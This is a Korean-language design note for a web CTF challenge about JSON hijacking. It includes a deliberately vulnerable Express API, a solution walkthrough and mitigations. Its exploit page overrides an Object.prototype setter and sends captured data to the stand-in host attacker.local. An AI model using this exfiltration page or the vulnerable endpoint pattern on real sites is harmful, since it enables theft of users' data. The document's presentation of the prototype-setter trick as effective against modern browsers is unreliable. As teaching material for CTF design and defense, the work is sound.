---
title: JSON Hijacking via Object/Array Prototype Overriding — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, json-hijacking, prototype-override, same-origin-bypass, client-side, javascript]
confidence: high
---

# JSON Hijacking via Object/Array Prototype Overriding — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Secure Message Hub (보안 메시지 허브)
- **난이도**: High
- **핵심 컨셉**: 웹 브라우저의 보안 통제 규칙인 동일 출처 정책(SOP)을 클라이언트단 스크립트 엔진의 글로벌 빌트인 프로토타입 변조 기법으로 우회하는 **JSON 하이재킹 (JSON Hijacking)** 취약점 문제입니다. 대상 애플리케이션은 로그인한 유저의 중요 기밀 메시지 데이터를 `/api/messages.json` 이라는 REST API를 통해 JSON 배열(`[{"id":1...}]`) 형태로 반환합니다. 일반적인 비동기 XMLHttp요청은 크로스 오리진 상황에서 CORS 설정에 의해 차단되지만, 공격자는 브라우저가 `<script src="...">` 태그를 활용해 외부 도메인의 자바스크립트를 차단 없이 로드할 수 있다는 특성을 이용합니다. 공격자는 악성 도메인에 접속한 피해자 브라우저의 글로벌 `Array` 프로토타입 생성자 혹은 `Object.prototype`을 조작하여 JSON 데이터가 로드되는 시점에 속성 값들을 탈취해 나갑니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Sensitive Message API (`/api/messages.json`)**:
  - 세션 인증을 체크하고 현재 로그인 사용자의 비공개 중요 알림 및 플래그를 JSON 배열로 리턴:
    `[{"id": 101, "sender": "admin", "body": "Secret Flag: FLAG{...}"}]`
- **Flag 위치**:
  - 중요 알림 본문 속 텍스트.

### 2.2 취약점 지점
1. **JSON Array Response Format**:
   - API 반환 데이터의 최상위 노드가 JSON 객체(`{}`)가 아닌 JSON 배열(`[]`)로 시작합니다.
   - 브라우저가 `<script src="http://target.local/api/messages.json">` 형태로 호출하면, 브라우저 스크립트 엔진은 이 JSON 배열을 유효한 자바스크립트 배열 생성 구문으로 인식하고 파싱을 진행합니다.
2. **Global Prototype Overriding in Legacy/Vulnerable Environments**:
   - 공격자는 브라우저가 내부 객체를 생성할 때 참조하는 글로벌 생성자인 `Array` 생성자나 `Object.prototype.__defineSetter__` 기능을 악용하여, JSON 배열 항목이 초기화 및 적재되는 순간 속성값이 공격자 커스텀 세터 함수로 넘어가게 만들어 자바스크립트 런타임 상에서 데이터를 하이재킹합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 방식 | 반환 데이터 형식 | 클라이언트 로딩 기법 |
|------------|--------|-----------|------------------|----------------------|
| `/api/messages.json` | GET | 세션 필요 (Cookie) | JSON Array (`[...]`) | `<script>` 태그를 이용한 크로스 도메인 임포트 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. API 응답 형식 파악
1. 포털에 로그인한 상태에서 기밀 메시지 API를 호출합니다.
   `GET /api/messages.json`
2. 응답이 다음과 같이 최상단에 중괄호 없이 대괄호로 시작하는 배열 형식임을 식별합니다.
   ```json
   [
     {
       "title": "Welcome",
       "flag": "FLAG{json_hijacking_array_prototype_override}"
     }
   ]
   ```
3. CORS 정책이 막혀있더라도 `<script>` 태그로 호출하면 강제 스크립트 컴파일이 유도되어 SOP가 우회됨을 인지합니다.

### Step 2. Array 프로토타입 세터 가동용 악성 스크립트 설계
피해자 브라우저가 악성 도메인을 열었을 때, 전역 `Object` 속성이 생성될 때 작동할 감시 세터(Setter)를 오버라이딩합니다.
- **오버라이딩 익스플로잇 (`exploit.html`)**:
  ```html
  <!DOCTYPE html>
  <html>
  <body>
      <script>
          // 글로벌 Object의 prototype 세터를 오버라이딩하여 
          // JSON 배열 내의 객체가 키 'flag'를 가질 때 가로채도록 설정
          Object.defineProperty(Object.prototype, 'flag', {
              set: function(value) {
                  // 탈취한 데이터를 공격자 서버로 송출
                  fetch('http://attacker.local/log?data=' + encodeURIComponent(value));
              }
          });
      </script>
      
      <!-- 피해자 세션 쿠키를 동반하여 타겟 도메인의 JSON 배열 API를 스크립트로 로드 -->
      <!-- 브라우저는 배열 내의 {} 객체를 구성하면서 'flag' 키값을 셋팅하고 세터가 발화함 -->
      <script src="http://target.local/api/messages.json"></script>
  </body>
  </html>
  ```

### Step 3. 피해자 유도 및 XSS 트리거
1. 공격자는 위와 같이 설계한 `exploit.html`을 공격자 외부 서버(`http://attacker.local/exploit.html`)에 배치합니다.
2. 타겟 서비스에 로그인되어 있는 관리자 봇(Admin Bot)의 브라우저가 해당 링크에 방문하도록 유도합니다.

### Step 4. flag 획득
1. 관리자 봇의 브라우저가 악성 페이지를 열면 `Object.prototype`의 'flag' 속성에 커스텀 세터가 장착됩니다.
2. 연달아 `<script>` 태그를 통해 `target.local/api/messages.json`을 가져옵니다. 봇의 브라우저는 관리자 쿠키를 동봉하므로 정상적인 기밀 JSON 배열 데이터가 반환됩니다.
3. 브라우저 자바스크립트 엔진이 다운로드한 배열 속 JSON 오브젝트들을 구성하는 런타임 단계에서, 각 오브젝트 내부의 `flag` 속성을 세팅하는 순간 오버라이딩해 둔 세터 함수가 호출됩니다.
4. 공격자 로거 서버에 플래그 데이터(`FLAG{json_hijacking_array_prototype_override}`)가 전송되어 탈취에 성공합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Node.js Express)

```javascript
// server.js (취약한 JSON Array 반환 API 예시)
const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();

app.use(cookieParser());

app.get('/api/messages.json', (req, res) => {
    const session = req.cookies.session;
    
    // 세션 인증 체크
    if (session !== "valid_admin_session_key") {
        return res.status(401).json({ error: "Unauthorized" });
    }

    // 취약점 지점 1: 최상위 노드를 JSON 객체 {} 가 아닌 배열 [] 형식으로 리턴
    // 이로 인해 <script src="..."> 태그를 통한 강제 자바스크립트 컴파일이 수락됨
    // 취약점 지점 2: X-Content-Type-Options: nosniff 가 설정되어 있지 않아 
    // 브라우저가 text/plain 등의 MIME 형태도 스크립트로 오인해 로드함
    return res.json([
        {
            "id": 1,
            "title": "System Alert",
            "flag": "FLAG{json_hijacking_array_prototype_override}"
        }
    ]);
});

app.listen(8080);
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **최상위 JSON 객체 반환 강제 (Always Return JSON Objects)**:
   - 모든 API 응답 시 최상위 노드를 대괄호(`[]`)로 시작하는 배열이 아닌, 반드시 중괄호(`{}`)로 묶인 표준 JSON 객체 형식으로 강제 제한합니다.
   - 예: `{"data": [...]}`
   - 브라우저는 `{}` 형식의 스크립트 로드를 시도하면 자바스크립트 문법 에러(Syntax Error: Unexpected token ':')를 띄우고 즉시 컴파일을 파기하므로, 가공 중 탈취 위협이 해소됩니다.
2. **`X-Content-Type-Options: nosniff` 헤더 선언**:
   - HTTP 보안 헤더 설정을 통해, 스크립트가 아닌 일반 데이터 MIME 타입 응답을 브라우저가 악의적으로 스크립트화하여 실행하는 행위를 원천 방지합니다.
3. **요청 검증용 CSRF 토큰 / Authorization 헤더 강제**:
   - 민감 데이터를 반환하는 모든 GET API 리퀘스트 시 브라우저가 자동 동봉하는 쿠키 세션 검증에만 의존하지 않고, 클라이언트가 직접 헤더에 실어 전송해야 하는 커스텀 인증 헤더(예: `Authorization: Bearer ...` 또는 CSRF 검증 토큰)의 존재를 필수로 규정합니다.
